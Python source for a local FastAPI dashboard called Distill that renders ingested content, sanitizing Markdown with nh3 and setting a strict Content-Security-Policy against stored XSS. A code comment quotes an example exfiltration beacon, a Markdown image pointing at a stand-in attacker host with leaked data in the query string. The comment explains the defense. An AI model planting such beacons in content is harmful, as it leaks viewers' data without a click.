"""Distill local web server — read-only dashboard over the file-based library."""

import threading
import webbrowser
from pathlib import Path

import uvicorn
from fastapi import FastAPI
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates

from distill.cli_shared import duration_str, format_date, strip_frontmatter
from distill.config import DistillConfig
from distill.pipeline.dashboard_data import format_run_timestamp

WEB_DIR = Path(__file__).parent


def create_app(config: DistillConfig) -> FastAPI:
    app = FastAPI(title="Distill", docs_url=None, redoc_url=None)
    app.state.config = config

    app.mount("/static", StaticFiles(directory=WEB_DIR / "static"), name="static")

    templates = Jinja2Templates(directory=WEB_DIR / "templates")

    # Register template filters.
    #
    # Artifact bodies are derived from untrusted ingested sources (a malicious
    # page or transcript could carry raw HTML, or an LLM could echo an injected
    # ``<script>`` into an insight). Templates render this through ``|markdown|
    # safe``, so the rendered HTML MUST be sanitized first -- otherwise it is a
    # stored-XSS vector in the dashboard. Sanitize the rendered output with nh3
    # (allowlist), per Python-Markdown's own guidance to sanitize output rather
    # than trust the renderer. If a sanitizer or renderer is unavailable, fail
    # safe by escaping everything.
    def _escape_all(text: str) -> str:
        escaped = text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        return f"<pre>{escaped}</pre>"

    try:
        import markdown as md_lib
        import nh3

        def md_filter(text: str) -> str:
            html = md_lib.markdown(text, extensions=["tables", "fenced_code"])
            # Drop <img>: an injected `![](http://attacker/leak?d=...)` in
            # ingested content would otherwise survive nh3 and auto-load on page
            # view -- a zero-click exfiltration beacon. Also restrict link
            # schemes and mark links noopener/nofollow. nh3 already strips
            # scripts and event handlers.
            return nh3.clean(
                html,
                tags=nh3.ALLOWED_TAGS - {"img"},
                url_schemes={"http", "https", "mailto"},
                link_rel="noopener noreferrer nofollow",
            )

    except ImportError:
        md_filter = _escape_all

    templates.env.filters["markdown"] = md_filter
    templates.env.filters["format_date"] = format_date
    templates.env.filters["duration"] = duration_str
    templates.env.filters["format_timestamp"] = format_run_timestamp
    templates.env.filters["strip_frontmatter"] = strip_frontmatter
    templates.env.globals["asset_version"] = str(
        (WEB_DIR / "static" / "style.css").stat().st_mtime_ns
    )

    app.state.templates = templates

    @app.middleware("http")
    async def _security_headers(request, call_next):  # type: ignore[no-untyped-def]
        # Defense-in-depth for the dashboard, which renders untrusted ingested
        # content: block external images/connections (exfil beacons) even if the
        # sanitizer regresses. 'unsafe-inline' is allowed for the dashboard's own
        # inline styles/scripts; img-src/default-src 'self' is the exfil defense.
        response = await call_next(request)
        response.headers["Content-Security-Policy"] = (
            "default-src 'self'; img-src 'self'; "
            "style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'; "
            "base-uri 'none'; form-action 'self'"
        )
        response.headers["Referrer-Policy"] = "no-referrer"
        return response

    from distill.web.routes import channels, costs, dashboard, topics, videos, watchlist

    app.include_router(dashboard.router)
    app.include_router(topics.router)
    app.include_router(channels.router)
    app.include_router(videos.router)
    app.include_router(costs.router)
    app.include_router(watchlist.router)

    return app


def run_server(config: DistillConfig, host: str, port: int, open_browser: bool):
    app = create_app(config)
    if open_browser:
        threading.Timer(1.0, lambda: webbrowser.open(f"http://{host}:{port}")).start()
    uvicorn.run(app, host=host, port=port, log_level="warning")
